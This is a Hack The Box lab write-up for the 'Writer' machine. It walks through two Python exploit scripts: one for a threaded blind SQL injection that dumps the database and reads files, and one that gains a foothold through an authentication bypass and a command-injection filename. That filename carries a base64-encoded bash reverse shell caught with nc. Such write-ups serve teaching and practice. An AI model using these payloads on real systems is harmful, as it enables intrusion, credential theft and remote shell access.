# Hack The Box. Machines. Writer

Machine write-up: https://7rocky.github.io/en/htb/writer

### `sqli.py`

This is an automated Python script that dumps the contents of the current MySQL database exploiting a Boolean-based blind SQL injection. It also provides the option to read files from the server using `LOAD_FILE`.

The function that dumps the database is `dump_db`:

```python
def dump_db():
    print('Version:', dump_content('version()'))
    db = {}
    database = dump_content('database()')
    n_tables = dump_content(
        sql(COUNT, TABLES, f"table_schema='{database}'"))

    db[database] = {}

    for i in range(int(n_tables)):
        table_name = dump_content(
            sql('table_name', TABLES, f"table_schema='{database}'", i))

        db[database][table_name] = {}

        if table_name == 'stories':
            continue

        n_cols = dump_content(
            sql(COUNT, COLUMNS, f"table_name='{table_name}'"))
        n_rows = dump_content(
            sql(COUNT, table_name))

        for j in range(int(n_cols)):
            column_name = dump_content(
                sql('column_name', COLUMNS, f"table_name='{table_name}'", j))

            if db[database][table_name].get(column_name) is None:
                db[database][table_name][column_name] = []

            if column_name in {'ganalytics', 'date_created'}:
                continue

            for k in range(int(n_rows)):
                row_value = dump_content(
                    sql(column_name, table_name, limit=k))
                db[database][table_name][column_name].append(row_value)

    print(json.dumps(db, indent=2))
```

First, it shows the version of MySQL. And then, it starts the dumping process:

1. Get the name of the current database
2. Get the name of the tables in the current database
3. For each table, get the name of the columns
4. For each column, get all values (rows)

Table `stories` and columns `ganalitics` and `date_created` where skipped because they where too large and useless to compromise the machine.

To dump the contents of a given value, we use `dump_content` providing a valid SQL query. To create the query, we make use of the `sql` function:

```python
def sql(column: str, table: str, where: str = '', limit: int = None) -> str:
    if not where and limit is None:
        return f'(select {column} from {table})'
    elif limit is None:
        return f'(select {column} from {table} where {where})'
    elif not where:
        return f'(select {column} from {table} limit {limit},1)'

    return f'(select {column} from {table} where {where} limit {limit},1)'
```

Depending on the type of query we need, we can add or remove parameters. As shown above, we consider four possibilities.

The function called `dump_content` is this one:

```python
def dump_content(payload: str) -> str:
    n = get_length(payload)
    data = ['_' for _ in range(n)]
    start_threads(n, (data, payload, 32, 126))

    return ''.join(data)
```

Basically, it gets the length of the value we want to dump and creates a list of characters of this length, in order to find characters one by one using threads.

Function `get_length` obtains the length of a given value as follows:

```python
def get_length(payload: str) -> int:
    n = 1

    while not do_sqli(get_data_length(payload, n)):
        n += 1

        if n > 10:
            print('NOT FOUND')
            sys.exit()

    data = [' ' for _ in range(n)]

    payload = f'convert(length({payload}),char)'
    start_threads(n, (data, payload, ord('0'), ord('9')))

    return int(''.join(data))
```

Basically, it uses `get_data_length` to get the number of digits of the length of the value (this is useful to dump local files). With this number of digits, we create a list of character positions in order to dump each digit one by one using threads.

Function `get_data_length` is a bit simpler:

```python
def get_data_length(payload: str, n: int) -> Dict[str, str]:
    return {
        'uname': f"' or length(convert(length({payload}),char))={n};-- -",
        'password': 'asdf'
    }
```

It only returns the payload to check if the length of the length of a subquery is `n` (notice that the length of the length converted to string is just the number of digits of the desired length).

The core of the dumping process is `do_sqli`, which returns `False` if the authentication is wrong (query gaved an error) or `True` if authentication is correct (query was successful):

```python
url = 'http://10.10.11.101/administrative'

def do_sqli(data: Dict[str, str]) -> bool:
    return 'error' not in requests.post(url, data=data).text
```

The function that makes the requests using threads is `start_threads`:

```python
def start_threads(n: int, args: Tuple[List[str], str, int, int]):
    with ThreadPoolExecutor(max_workers=100) as pool:
        for i in range(n):
            pool.submit(get_content, *args, i)
```

Every thread is calling `get_content`, which does magic and obscure things:

```python
def get_content(data: List[str], payload: str, start: int, end: int, i: int):
    def checker(c: int) -> bool:
        return do_sqli(get_data_content(payload, i, c))

    ascii_value = binary_search(checker, start, end)

    data[i] = chr(ascii_value)
```

First it creates a `checker` function to check if a given ASCII value is correct or not (using `do_sqli` and `get_data_content`). This function `get_data_content` is pretty similar to `get_data_length`, it just returns the needed data to send the POST request:

```python
def get_data_content(payload: str, i: int, c: int) -> Dict[str, str]:
    return {
        'uname': f"' or ascii(substr({payload},{i + 1},1))<{c};-- -",
        'password': 'asdf'
    }
```

Notice the use of `ASCII` and `SUBSTR` SQL functions to check a certain character using its ASCII value (this way, we avoid problems with case-sensitivity).

Continuing with the explanation of `get_content`, we use a function called `binary_search`. Yes, this is black magic:

```python
def binary_search(checker: Func[[int], bool], left: int, right: int) -> int:
    mid = (left + right) // 2

    if mid == left and checker(mid):
        return -1

    if not checker(mid) and (mid == right or checker(mid + 1)):
        return mid

    if not checker(mid):
        return binary_search(checker, mid + 1, right)

    return binary_search(checker, left, mid)
```

This procedure will speed up the dumping process. The following example is for letter `w` (ASCII: 119):

```
                        *
32 33 34   ...   77 78 79 80 81   ...   124 125 126
    !  "   ...    M  N  O  P  Q   ...     |   }   ~
FALSE

                           *
81 82 83   ...   101 102 103 104 105 106   ...   124 125 126
 Q  R  S   ...     e   f   g   h   i   j   ...     |   }   ~
FALSE

                              *
104 105 106   ...   113 114 115 116 117   ...   124 125 126
  h   i   j   ...     q   r   s   t   u   ...     |   }   ~
FALSE

                      *
116 117 118 119 120 121 122 123 124 125 126
  t   u   v   w   x   y   z   {   |   }   ~
TRUE

          *
116 117 118 119 120 121
  t   u   v   w   x   y
FALSE

      *
119 120 121
  w   x   y
TRUE

  *
119 120
  w   x
SUCCESS: w
```

The function uses a kind of Binary Search algorithm, which has `O(log n)` complexity, so it will be pretty much faster than trying all characters in ASCII order (just compare the previous `7` requests using Binary Search to `119 - 32 + 1 = 88` requests needed to get a `w` if we used simple brute force).

Apart from dumping the database, we have a function `get_privileges` to see what privileges we have on the database:

```python
def get_privileges():
    user = dump_content('current_user()')
    print('User:', user)
    table_name = 'information_schema.user_privileges'
    privileges = {}

    column_names = ['grantee', 'privilege_type',
                    'table_catalog', 'is_grantable']
    n_rows = dump_content(sql(COUNT, table_name))

    for column_name in column_names:
        if privileges.get(column_name) is None:
            privileges[column_name] = []

        for k in range(int(n_rows)):
            row_value = dump_content(
                sql(column_name, table_name, limit=k))
            privileges[column_name].append(row_value)

    print(json.dumps(privileges, indent=2))
```

It basically uses previous functions to extract some contents of table `information_schema.user_privileges` knowing the column names beforehand.

And the most important function to compromise the machine is `get_file`:

```python
def get_file(filename):
    file = dump_content(f"to_base64(load_file('{filename}'))")

    try:
        print(base64.b64decode(file).decode())
    except binascii.Error:
        print(file)
```

What it does is load a file using `LOAD_FILE` and encode it in Base64 using `TO_BASE64` to prevent problems of having line breaks in the file. Then, it dumps the contents of the encoded file and decodes it.

The contents of the database can be obtained in a few minutes:

```console
$ python3 sqli.py
Version: 10.3.29-MariaDB-0ubuntu0.20.04.1
{
  "writer": {
    "site": {
      "id": [
        "1"
      ],
      "title": [
        "Story Bank"
      ],
      "description": [
        "This is a site where I publish my own and others stories"
      ],
      "logo": [
        "/img/logo.png"
      ],
      "favicon": [
        "/img/favicon.ico"
      ],
      "ganalytics": []
    },
    "stories": {},
    "users": {
      "id": [
        "1"
      ],
      "username": [
        "admin"
      ],
      "password": [
        "118e48794631a9612484ca8b55f622d0"
      ],
      "email": [
        "admin@writer.htb"
      ],
      "status": [
        "Active"
      ],
      "date_created": []
    }
  }
}
Time: 151.73599529266357 s
```

We can also get a file. For example, `/etc/hosts`:

```console
$ python3 sqli.py /etc/hosts
127.0.0.1 localhost
127.0.1.1 writer

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

Time: 25.915094137191772 s
```

### `foothold.py`

This Python script is used to gain access on the machine. There is a sequence of tasks neede to do in order to make it:

First, we need to have admin privileges. For that, we use a SQLi payload to bypass authentication. Notice that we use `requests.session` to keep the cookies in subsequent requests:

```python
s = requests.session()
s.post('http://10.10.11.101/administrative',
        data={'uname': "' or 1=1;-- -", 'password': 'asdf'})
```

Then we create the malicious file (as an empty file) with a crafted filename so that we can exploit a command injection vulnerability:

```python
rev = f'bash -i  >& /dev/tcp/{lhost}/{lport} 0>&1'
rm = 'rm /var/www/writer.htb/writer/static/img/fdsa*'
command = b64e(f'{rm}; {rev}'.encode()).decode()

filename = f'fdsa.jpg x;echo {command}|base64 -d|bash;'

with open(filename, 'wb') as f:
    f.write(b'')
```

The malicious command is composed of an `rm` command to clear some files in the images directory and a reverse shell payload encoded in Base64. Then the filename is made so that we do not break the `mv` command. Recall that the server is using this sentence:

```python
os.system("mv {} {}.jpg".format(local_filename, local_filename))
```

Furthermore, the filename must contain `".jpg"` as a substring because the server is doing this validation:

```python
image_url = request.form.get('image_url')
if ".jpg" in image_url:
    # ...
```

The next step is to upload the malicious file as a proper file using a POST request:

```python
s.post('http://10.10.11.101/dashboard/stories/add', data={
    'author': 'Me',
    'title': 'New story',
    'tagline': 'Tag',
    'image_url': '',
    'content': 'Nothing special'
}, files={
    'image': open(filename, 'rb')
})
```

And then, we have to upload again this file but using a URL that points to a local file instead. This way, we trigger the use of `urllib.requests.urlretrieve`, which has a different behaviour when retrieving a remote file and a local file. In the case of a local file, the filename is not modified, and thus the command injection is successful:

```python
try:
    s.post(f'http://10.10.11.101/dashboard/stories/add', data={
        'author': 'Me',
        'title': 'New story',
        'tagline': 'Tag',
        'image_url': f'file:///var/www/writer.htb/writer/static/img/{filename}',
        'content': 'Nothing special'
    }, files={
        'image': ('', b'')
    }, timeout=2)
except requests.exceptions.ReadTimeout:
    pass
```

Notice the use of `timeout=2` and `requests.exceptions.ReadTimeout` because the server will send the reverse shell and will not send the HTTP response.

Finally, we can remove the malicious file from our local environment and delete the story created for the exploitation (for that, we need to take the story ID using a regular expression):

```python
os.remove(filename)

r = s.get('http://10.10.11.101/dashboard/stories')
story_id = int(re.findall(r'<td>\s*(\d+)\s*</td>', r.text)[-1])

if story_id > 8:
    s.post(f'http://10.10.11.101/dashboard/stories/delete/{story_id}')
```

So, executing the exploit indicating the local IP address and the local port to listen with `nc` will return a reverse shell on the machine:

```console
$ python3 foothold.py 10.10.17.44 4444
```

```console
$ nc -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.101.
Ncat: Connection from 10.10.11.101:53600.
bash: cannot set terminal process group (1055): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$ 
```
